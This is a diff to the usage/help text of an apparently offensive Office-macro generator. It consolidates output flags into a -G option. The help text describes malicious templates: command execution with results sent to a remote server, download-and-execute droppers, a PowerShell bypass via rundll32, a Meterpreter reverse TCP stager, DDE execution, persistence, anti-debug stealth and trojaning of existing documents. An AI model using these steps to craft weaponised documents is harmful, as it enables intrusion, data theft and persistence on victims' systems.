@@ -2,7 +2,7 @@
 # encoding: utf-8
 
 from termcolor import colored
-import sys
+
 
 def printTemplatesUsage(banner, currentApp):
     print(colored(banner, 'green'))
@@ -18,28 +18,28 @@ def printTemplatesUsage(banner, currentApp):
         HELLO  
         Just print a hello message and awareness about macro
         Give this template the name or email of the author 
-          -> Example: echo "@Author" | %s -t HELLO -P hello.pptm
+          -> Example: echo "@Author" | %s -t HELLO -G hello.pptm
           
                 -------------------- 
         
         CMD
         Execute a command line and send result to remote http server
         Give this template the server url and the command to run
-          -> Example:  echo "http://192.168.0.5:7777" "dir /Q C:" | %s -t CMD -o -w cmd.doc
+          -> Example:  echo "http://192.168.0.5:7777" "dir /Q C:" | %s -t CMD -o -G cmd.doc
           
                 --------------------
                     
         DROPPER
         Download and execute a file
         Give this template the file url and the target file path
-          -> Example:  echo <file_to_drop_url> "<download_path>" | %s -t DROPPER -o -x dropper.xls
+          -> Example:  echo <file_to_drop_url> "<download_path>" | %s -t DROPPER -o -G dropper.xls
           
                 --------------------
                 
         DROPPER2
         Download and execute a file. File attributes are also set to system, read-only, and hidden
         Give this template the file url and the target file path
-          -> Example:  echo <file_to_drop_url> "<download_path>" | %s -t DROPPER2 -o -X dropper.xlsm
+          -> Example:  echo <file_to_drop_url> "<download_path>" | %s -t DROPPER2 -o -G dropper.xlsm
           
                 --------------------  
                 
@@ -47,7 +47,7 @@ def printTemplatesUsage(banner, currentApp):
         Download and execute Powershell script using rundll32 (to bypass blocked powershell.exe)
         Note: This payload will download PowerShdll from Github.
         Give this template the url of the powershell script you want to run
-         -> Example:  echo "<powershell_script_url>" | %s -t DROPPER_PS -o -w powpow.doc
+         -> Example:  echo "<powershell_script_url>" | %s -t DROPPER_PS -o -G powpow.doc
          
                 --------------------  
                 
@@ -55,7 +55,7 @@ def printTemplatesUsage(banner, currentApp):
         Meterpreter reverse TCP template using MacroMeter by Cn33liz.
         This template is CSharp Meterpreter Stager build by Cn33liz and embedded within VBA using DotNetToJScript from James Forshaw
         Give this template the IP and PORT of listening mfsconsole
-         -> Example: echo <ip> <port> | %s -t METERPRETER -o -W meter.docm 
+         -> Example: echo <ip> <port> | %s -t METERPRETER -o -G meter.docm 
          
         Recommended msfconsole options (use exploit/multi/handler):
         set PAYLOAD windows/meterpreter/reverse_tcp
@@ -74,8 +74,8 @@ def printTemplatesUsage(banner, currentApp):
         This template is inspired by https://github.com/khr0x40sh/MacroShop
         Give this template the path to exe you want to embed in vba and, optionaly, the path where exe should be extracted
         If extraction path is not given, exe will be extracted with random name in current path. 
-         -> Example1: echo "path\\to\my_exe.exe" | %s  -t EMBED_EXE -o -X my_exe.xlsm
-         -> Example2: echo "path\\to\my_exe.exe" "D:\\another\path\your_exe.exe" | %s  -t EMBED_EXE -o -X my_exe.xlsm
+         -> Example1: echo "path\\to\my_exe.exe" | %s  -t EMBED_EXE -o -G my_exe.xlsm
+         -> Example2: echo "path\\to\my_exe.exe" "D:\\another\path\your_exe.exe" | %s  -t EMBED_EXE -o -G my_exe.xlsm
 
                 --------------------  
 """ % (currentApp,currentApp,currentApp,currentApp,currentApp,currentApp,currentApp,currentApp)
@@ -97,7 +97,9 @@ def printUsage(banner, currentApp, mpSession):
     --keep-alive    Use with --vbom-encode option. Ensure new app instance will stay alive even when macro has finished
     --persist       Use with --vbom-encode option. Macro will automatically be persisted in application startup path 
                     (works with Excel documents only). The macro will be then be executed anytime an Excel document is opened.
-    --trojan       Inject macro in an existing MS office file. Use in conjunction with -x, -X, -w, or -W
+    -T, --trojan=OUTPUT_FILE_PATH   Inject macro in an existing MS office file. 
+                    Supported files are the same as for the -G option
+                    If file does not exist, it will be created (like -G option)
     --stealth      Anti-debug and hiding features
     --dcom=REMOTE_FILE_PATH Open remote document using DCOM for pivot/remote exec if psexec not possible for example.
                    This will trigger AutoOpen/Workboo_Open automatically. 
@@ -124,26 +126,18 @@ def printUsage(banner, currentApp, mpSession):
         Available templates are: HELLO, CMD, DROPPER, DROPPER2, DROPPER_PS, METERPRETER, EMBED_EXE 
         Help for template usage: %s -t help
          
-    -v, --vba-output=VBA_FILE_PATH Output generated vba macro (text format) to given path.         
-""" % (currentApp,currentApp)   
-
-    details +=proDetails
-
-    # Only enabled on windows
-    if sys.platform == "win32":
-        details += \
-"""
-    -X, --excel-output=EXCEL_FILE_PATH \t Generates MS Excel (*.xlsm) file.
-    -x, --excel97-output=EXCEL_FILE_PATH Generates MS Excel 97-2003 (*.xls) file.
-    -W, --word-output=WORD_FILE_PATH \t Generates MS Word (.docm) file.
-    -w, --word97-output=WORD_FILE_PATH \t Generates MS Word 97-2003 (.doc) file.
-    -P, --ppt-output=PPT_FILE_PATH \t Generates MS PowerPoint (.pptm) file.
+    -G, --generated=OUTPUT_FILE_PATH. Generates a file containing the macro. Will guess the format based on extension.
+        Supported extensions are: vba, doc, docm, docx, xls, xlsm, pptm.
+        Note: Apart from vba which is a text files, all other extension requires Windows OS with genuine MS Office installed.
     
     --dde \t Dynamic Data Exchange attack mode. Input will be inserted as a cmd command and executed via DDE
          DDE attack mode is not compatible with VBA Macro related options.
-         Usage: echo calc.exe | %s --dde -W DDE.docx
-         
-"""  % (currentApp)
+         Usage: echo calc.exe | %s --dde -G DDE.docx
+         Note: This option requires Windows OS with genuine MS Office installed.  
+               
+""" % (currentApp,currentApp, currentApp)   
+
+    details +=proDetails
     details +="    -h, --help   Displays help and exit"
     details += \
 """
